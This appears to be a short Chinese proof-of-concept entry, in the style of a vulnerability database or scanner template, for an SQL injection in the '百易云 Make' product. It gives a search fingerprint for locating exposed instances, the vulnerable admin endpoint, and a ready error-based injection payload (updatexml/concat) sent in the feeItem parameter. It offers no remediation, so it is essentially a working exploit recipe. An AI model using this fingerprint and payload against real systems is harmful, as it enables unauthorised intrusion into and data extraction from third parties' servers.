# 百易云Make存在Sql注入漏洞

百易云 ｜ SQL注入 ｜ —
- **指纹**：`body="media/css/uniform.default.css"`
- **请求**：`POST /adminx/imaRead.make.php?act=remake HTTP/1.1`

**Payload**
```
feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(123)),1)
```
- **响应特征**：200